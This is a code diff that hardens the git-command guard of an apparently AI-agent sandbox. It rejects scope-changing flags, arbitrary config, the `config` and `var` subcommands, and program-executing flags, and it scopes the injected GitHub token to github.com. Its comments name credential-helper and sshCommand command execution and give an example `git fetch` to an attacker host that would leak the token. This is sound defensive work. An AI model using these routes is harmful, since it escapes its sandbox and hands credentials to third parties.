@@ -78,35 +78,68 @@ export function assertCwdInWritePaths(
 }
 
 /**
- * Reject global git flags that redirect scope away from the sandbox — `-C
- * /elsewhere`, `--git-dir=…`, `--work-tree=…`. All three defeat
- * `assertCwdInWritePaths` and any allow/deny pattern that assumes the repo
- * is the task worktree, so they are always rejected regardless of the
- * agent's `bash_run` config — this is sandbox integrity, not a capability
- * the agent can opt into.
+ * Rechaza los flags y subcomandos de git que escapan del sandbox, sin
+ * importar lo que el agente tenga en su allowlist — esto es integridad del
+ * sandbox, no una capacidad a la que se pueda optar.
+ *
+ * Tres familias, cada una por un motivo distinto:
+ *
+ *  1. **Redirigen el árbol de trabajo** (`-C`, `--git-dir`, `--work-tree`):
+ *     derrotan `assertCwdInWritePaths` y cualquier patrón que asuma que el
+ *     repo es el worktree de la task.
+ *  2. **Config arbitraria** (`-c`/`--config-env` globales, `--config` de
+ *     `clone`, y el subcomando `config`): dos claves son ejecución de
+ *     comandos (`credential.helper=!<cmd>`, `core.sshCommand`), y `config`
+ *     además IMPRIME la credencial que `gitAuthArgs` inyecta —`-c` viaja a
+ *     los subprocesos por `GIT_CONFIG_PARAMETERS`— o la PERSISTE para las
+ *     corridas siguientes. `var` entra acá porque `git var -l` también
+ *     vuelca la config.
+ *  3. **Ejecutan un programa del otro lado** (`--upload-pack`,
+ *     `--receive-pack`, `--exec`): contra un remote que es un path local,
+ *     ese "otro lado" es esta misma máquina.
+ *
+ * `-c` se rechaza SÓLO en posición global (antes del subcomando), que es
+ * donde significa config. Después del subcomando es otra cosa y legítima:
+ * `git commit -c <commit>`, `git switch -c <branch>`.
  */
+const GIT_EXEC_FLAGS = ['--upload-pack', '--receive-pack', '--exec', '--config']
+const GIT_DENIED_SUBCOMMANDS = new Set(['config', 'var'])
+
 function assertNoScopeChangingGitFlags(argv: string[]): void {
+  let subcommand: string | undefined
   for (let i = 1; i < argv.length; i++) {
     const a = argv[i]
     if (a === '-C' || a === '--git-dir' || a === '--work-tree') {
       throw new Error(`git flag no permitido: ${a} (redirige el sandbox fuera del worktree)`)
     }
-    // `-c` es config arbitraria por invocación, y dos de sus claves son
-    // ejecución de comandos: `credential.helper=!<cmd>` y `core.sshCommand`
-    // hacen que git corra lo que digan — o sea, un escape del allowlist que
-    // este tool existe para imponer. Además pisaría el `-c http.extraHeader`
-    // que inyectamos abajo (en git gana el último), dejando al agente
-    // desautenticado o apuntando su credencial a otro host.
-    if (a === '-c' || a === '--config-env' || a.startsWith('--config-env=')) {
-      const flag = a.startsWith('--config-env=') ? '--config-env' : a
-      throw new Error(`git flag no permitido: ${flag} (config arbitraria escapa del allowlist)`)
-    }
     if (a.startsWith('--git-dir=') || a.startsWith('--work-tree=')) {
       const flag = a.split('=')[0]
       throw new Error(`git flag no permitido: ${flag} (redirige el sandbox fuera del worktree)`)
     }
-    // Boundary between global flags and the subcommand.
-    if (!a.startsWith('-')) break
+    if (a === '-c' || a === '--config-env' || a.startsWith('--config-env=')) {
+      const flag = a.startsWith('--config-env=') ? '--config-env' : a
+      throw new Error(`git flag no permitido: ${flag} (config arbitraria escapa del allowlist)`)
+    }
+    // Frontera entre los flags globales y el subcomando.
+    if (!a.startsWith('-')) {
+      subcommand = a
+      break
+    }
+  }
+
+  if (subcommand && GIT_DENIED_SUBCOMMANDS.has(subcommand)) {
+    throw new Error(
+      `git ${subcommand} no permitido (lee o persiste la credencial inyectada en el run)`,
+    )
+  }
+
+  // Estos van en cualquier posición: son opciones del subcomando, así que el
+  // barrido de arriba —que corta en el subcomando— nunca los vería.
+  for (const a of argv.slice(1)) {
+    const flag = GIT_EXEC_FLAGS.find((f) => a === f || a.startsWith(`${f}=`))
+    if (flag) {
+      throw new Error(`git flag no permitido: ${flag} (ejecuta un programa fuera del allowlist)`)
+    }
   }
 }
 
@@ -176,13 +209,28 @@ export interface SpawnedProc {
  * port resuelve el token por invocación, así que un installation token que
  * caduca a la hora se renueva solo entre un run y el siguiente.
  *
+ * La clave va SCOPEADA por URL (`http.<url>.extraHeader`), no pelada. Es la
+ * diferencia entre esto y `WorkspaceManager`, y no es cosmética: ahí la URL
+ * la construye el engine, acá el argv lo escribe el AGENTE. Un
+ * `http.extraHeader` global aplica el `Authorization` a toda petición HTTP de
+ * esa invocación, así que un `git fetch https://attacker.tld/x` —que matchea
+ * un allowlist tan común como `git fetch *`— le entregaría la credencial de
+ * GitHub al host que el agente elija. Scopeada, git sólo la manda a URLs bajo
+ * `https://github.com/`.
+ *
  * Igual que en `WorkspaceManager`, el token queda en `argv` mientras el
  * proceso corre (visible por `ps` DENTRO del contenedor). Es transitorio y
  * mucho menos grave que persistirlo en disco — y en este sandbox no es
  * alcanzable: `bash_run` no tiene shell y el allowlist del agente no incluye
  * `ps`. Por eso tampoco se loguea: el `log.info` de abajo imprime el argv
  * del agente, no el que se spawnea.
+ *
+ * Lo que SÍ podría leerlo es el propio git: `-c` viaja a los subprocesos por
+ * `GIT_CONFIG_PARAMETERS` y `git config --get-all` lo imprimiría en stdout.
+ * Por eso el guard de abajo rechaza el subcomando `config` (y `var`).
  */
+const GITHUB_URL_SCOPE = 'https://github.com/'
+
 async function gitAuthArgs(argv: string[]): Promise<string[]> {
   if (argv[0] !== 'git') return []
   const resolve = getGitTokenPort()
@@ -190,7 +238,7 @@ async function gitAuthArgs(argv: string[]): Promise<string[]> {
   const token = await resolve()
   if (!token) return []
   const basic = Buffer.from(`x-access-token:${token}`).toString('base64')
-  return ['-c', `http.extraHeader=Authorization: Basic ${basic}`]
+  return ['-c', `http.${GITHUB_URL_SCOPE}.extraHeader=Authorization: Basic ${basic}`]
 }
 
 /**
